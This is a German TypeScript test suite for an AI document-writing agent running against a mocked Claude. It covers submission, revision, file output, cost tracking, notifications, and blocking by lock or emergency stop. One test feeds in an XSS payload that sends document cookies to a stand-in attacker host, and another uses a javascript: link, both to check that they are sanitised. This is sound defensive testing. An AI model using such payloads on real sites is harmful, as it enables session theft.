// Der Analyst (Dokumente auf Zuruf) gegen einen nachgebauten Claude. Geprüft wird der ganze Weg: Auftrag,
// Abgabe über das Gateway, Nachbessern bei Mängeln, Ablage als Datei, Meldung aufs Handy, Abbruch durch
// Sperre oder Not-Aus, und dass ein eingeschleuster Link oder Skript nicht im fertigen Dokument landet.

import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import path from "node:path";
import { after, before, beforeEach, describe, test } from "node:test";
import { sichereUmgebung } from "../helfer/umgebung";
import { starteClaudeMock, type ClaudeMock } from "../mocks/claude-mock";

const dir = sichereUmgebung("dokumente");
// Kein Chrome in diesem Test: Das PDF fällt aus, die Webseite bleibt. Genau dieser Rückfall wird geprüft.
process.env.JARVIS_CHROME = path.join(dir, "gibt-es-nicht");

let claude: ClaudeMock;
let docs: typeof import("../../src/lib/server/documents");
let config: typeof import("../../src/lib/server/config");
let zustand: typeof import("../../src/lib/server/gateway/zustand");
let audit: typeof import("../../src/lib/server/gateway/audit");
let notify: typeof import("../../src/lib/server/notify");

const abschnitt = (extra: Record<string, unknown> = {}) => ({
  ueberschrift: "Überblick",
  absaetze: ["Der Markt wächst [1]."],
  punkte: [],
  tabelle: { titel: "", spalten: [], zeilen: [], quelle: "" },
  grafik: { art: "keine", titel: "", einheit: "", quelle: "", werte: [], stufen: [] },
  ...extra,
});
const dokument = (extra: Record<string, unknown> = {}) => ({
  titel: "Goldmarkt 2026",
  untertitel: "Kurzanalyse",
  kernaussagen: ["Gold bleibt gefragt.", "Notenbanken kaufen weiter.", "Die Zinsen bestimmen den Kurs."],
  abschnitte: [abschnitt()],
  quellen: [{ titel: "World Gold Council", url: "https://www.gold.org/bericht" }],
  ...extra,
});
const cfg = () => ({ name: "Benedikt", claude: { apiKey: "sk-test-nur-fuer-den-mock" } });
const letzter = async () => (await docs.documentsSnapshot()).jobs[0];

before(async () => {
  claude = await starteClaudeMock();
  process.env.ANTHROPIC_BASE_URL = claude.url;
  config = await import("../../src/lib/server/config");
  docs = await import("../../src/lib/server/documents");
  zustand = await import("../../src/lib/server/gateway/zustand");
  audit = await import("../../src/lib/server/gateway/audit");
  notify = await import("../../src/lib/server/notify");
  await config.writeConfig(cfg());
});

after(async () => {
  await claude.stop();
});

beforeEach(async () => {
  await docs.documentDone();
  if (await zustand.notausAktiv()) await zustand.notausAus("FREIGEBEN", "mac");
  await zustand.entsperreAgent("analyst", "mac");
});

describe("Analyst: vom Auftrag zum Dokument", () => {
  test("ein abgegebenes Dokument liegt als Datei vor; ohne Chrome als Webseite mit Hinweis", async () => {
    claude.drehbuch([{ werkzeug: "dokument_abgeben", eingabe: dokument() }]);
    await docs.startDocument(cfg(), "sk-test", { thema: "Goldmarkt", auftrag: "Kurz.", from: "mac" });
    await docs.documentDone();
    const job = await letzter();
    assert.equal(job.state, "fertig");
    assert.equal(job.title, "Goldmarkt 2026");
    assert.equal(job.pdf, null);
    assert.match(job.note ?? "", /als Webseite/);
    assert.ok(job.html?.startsWith(process.env.JARVIS_DOCS_DIR!), "liegt im Dokumentenordner");
    const html = readFileSync(job.html!, "utf8");
    assert.match(html, /Goldmarkt 2026/);
    assert.match(html, /World Gold Council/);
    const e = (await audit.leseAudit(10)).find((x) => x.was === "dokument_abgeben");
    assert.equal(e?.agent, "analyst");
    assert.equal(e?.ergebnis, "ausgefuehrt");
    // Die eine Antwort des nachgebauten Claude (10 Token Eingabe, 5 Ausgabe) kostet nach Listenpreis von Opus 5.5
    // 0,00014 Dollar. Das steht beim Dokument und im Kostenbuch beim Analysten.
    assert.ok(Math.abs(job.costUsd - 0.00014) < 1e-9, `Kosten des Dokuments: ${job.costUsd}`);
    const { kostenUebersicht } = await import("../../src/lib/server/kosten");
    const posten = (await kostenUebersicht()).heute.analyst?.claude;
    assert.ok(posten && posten.anfragen === 1 && Math.abs(posten.usd - 0.00014) < 1e-9, "im Kostenbuch gebucht");
  });

  test("der Auftrag steht als Daten im Auftrag, die Regeln im Systemprompt", () => {
    const a = claude.anfragen[0];
    assert.match(JSON.stringify(a.messages), /<auftrag>\\nThema: Goldmarkt/);
    assert.match(JSON.stringify(a.system), /Analyst von JARVIS/);
    const werkzeuge = (a.tools as { name: string }[]).map((t) => t.name);
    assert.deepEqual(werkzeuge.sort(), ["dokument_abgeben", "web_fetch", "web_search"]);
  });

  test("ein mangelhaftes Dokument wird zurückgegeben und nachgebessert", async () => {
    claude.drehbuch([
      { werkzeug: "dokument_abgeben", eingabe: dokument({ titel: "", quellen: [{ titel: "Böse", url: "javascript:alert(1)" }] }) },
      { werkzeug: "dokument_abgeben", eingabe: dokument({ titel: "Zweiter Anlauf" }) },
    ]);
    await docs.startDocument(cfg(), "sk-test", { thema: "Nachbessern", auftrag: "", from: "mac" });
    await docs.documentDone();
    const job = await letzter();
    assert.equal(job.state, "fertig");
    assert.equal(job.title, "Zweiter Anlauf");
    assert.equal(claude.anfragen.length, 2);
    assert.match(JSON.stringify(claude.anfragen[1].messages), /Noch nicht angenommen/);
    assert.match(JSON.stringify(claude.anfragen[1].messages), /keinen gültigen Link/);
  });

  test("Skripte und Formatierung aus dem Modell landen nicht als Code im Dokument", async () => {
    const boese = '<script>fetch("https://angreifer.example/?c="+document.cookie)</script><img src=x onerror=alert(1)>';
    claude.drehbuch([{ werkzeug: "dokument_abgeben", eingabe: dokument({ titel: `Test ${boese}`, kernaussagen: [boese, "Zweite.", "Dritte."], abschnitte: [abschnitt({ ueberschrift: boese, absaetze: [boese] })] }) }]);
    await docs.startDocument(cfg(), "sk-test", { thema: "Sauber", auftrag: "", from: "mac" });
    await docs.documentDone();
    const job = await letzter();
    assert.equal(job.state, "fertig");
    const html = readFileSync(job.html!, "utf8");
    assert.ok(!/<script[\s>]/i.test(html), "kein Skript");
    assert.ok(!/<img[^>]+onerror/i.test(html), "kein Bild mit Ereignis");
    assert.match(html, /&lt;script&gt;/);
  });

  test("gibt der Analyst nichts ab, endet der Auftrag mit einer verständlichen Meldung", async () => {
    claude.drehbuch([{ text: "Ich denke nach." }, { text: "Noch immer." }, { text: "Und weiter." }, { text: "Hm." }]);
    await docs.startDocument(cfg(), "sk-test", { thema: "Nichts", auftrag: "", from: "mac" });
    await docs.documentDone();
    const job = await letzter();
    assert.equal(job.state, "fehler");
    assert.match(job.error ?? "", /kein Dokument abgegeben/);
    assert.equal(claude.anfragen.length, 3, "nach zwei Erinnerungen ist Schluss");
  });
});

describe("Analyst: Grenzen", () => {
  test("immer nur ein Dokument zur Zeit", async () => {
    claude.drehbuch([{ werkzeug: "dokument_abgeben", eingabe: dokument() }]);
    await docs.startDocument(cfg(), "sk-test", { thema: "Erstes", auftrag: "", from: "mac" });
    await assert.rejects(docs.startDocument(cfg(), "sk-test", { thema: "Zweites", auftrag: "", from: "mac" }), /Ich schreibe gerade an „Erstes“/);
    await docs.documentDone();
  });

  test("gesperrt oder im Not-Aus startet kein Dokument, und Claude wird nicht gefragt", async () => {
    claude.drehbuch([]);
    await zustand.sperreAgent("analyst", "Test", "mac");
    await assert.rejects(docs.startDocument(cfg(), "sk-test", { thema: "Gesperrt", auftrag: "", from: "mac" }), docs.DocError);
    await zustand.entsperreAgent("analyst", "mac");
    await zustand.notausAn("Test", "mac");
    await assert.rejects(docs.startDocument(cfg(), "sk-test", { thema: "Not-Aus", auftrag: "", from: "mac" }), docs.DocError);
    assert.equal(claude.anfragen.length, 0);
  });

  test("ein fertiges Dokument vom Handy wird dorthin gemeldet, ein gescheitertes nur als Text", async () => {
    const meldungen: { text: string; file: string | null }[] = [];
    const ab = notify.onNotice((n) => n.kind === "dokument" && meldungen.push({ text: n.text, file: n.file }));
    claude.drehbuch([{ werkzeug: "dokument_abgeben", eingabe: dokument() }]);
    await docs.startDocument(cfg(), "sk-test", { thema: "Fürs Handy", auftrag: "", from: "telegram" });
    await docs.documentDone();
    claude.drehbuch([{ text: "a" }, { text: "b" }, { text: "c" }]);
    await docs.startDocument(cfg(), "sk-test", { thema: "Scheitert", auftrag: "", from: "telegram" });
    await docs.documentDone();
    ab();
    assert.equal(meldungen.length, 2);
    assert.ok(meldungen[0].file?.endsWith(".html"));
    assert.equal(meldungen[1].file, null);
    assert.match(meldungen[1].text, /nicht fertig geworden/);
  });

  test("ohne Thema kein Auftrag", async () => {
    await assert.rejects(docs.startDocument(cfg(), "sk-test", { thema: "  ", auftrag: "x", from: "mac" }), /Worüber soll das Dokument gehen/);
  });
});
